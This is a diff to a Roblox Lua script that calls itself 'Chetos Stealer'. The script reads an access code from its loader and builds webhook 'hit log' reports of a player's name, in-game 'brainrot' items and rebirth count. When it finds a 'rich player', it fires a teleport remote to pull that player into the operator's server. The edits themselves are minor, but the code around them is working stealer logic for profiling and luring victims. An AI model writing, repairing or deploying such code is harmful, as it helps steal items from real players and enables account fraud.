@@ -25,6 +25,7 @@ local CONFIG = {
     }
 }
 
+-- THIS PART READS THE DATA FROM YOUR LOADER
 local env = getgenv()
 local accessCode = nil
 if env then
@@ -191,7 +192,7 @@ function WebhookHandler:_buildHitLogPayload(player, sortedAnimals, rebirthCount)
         ("👤 Username: @%s"):format(player.Name)
     }, "\n")
     
-    local stats = ("TOTAL BRAINROTS: %d"):format(#sortedAnimals)
+    local stats = ("TOTAL BRAINROT`S: %d"):format(#sortedAnimals)
     local animalList = #animalStrings > 0 and table.concat(animalStrings, "\n") or "- No brainrots found on plot."
     local fieldName = string.format("🐾 All Brainrots (Top %d shown)", numItemsToShow)
 
@@ -238,7 +239,9 @@ function WebhookHandler:ScanAndReport()
         end
         
         task.wait(1)
-        ReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)
+        
+        local placeid = game.PlaceId
+        game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accessCode)
 
     elseif shouldPing and not accessCode then
         warn("Chetos Stealer: Rich player found but no accesscode was provided to teleport them.")
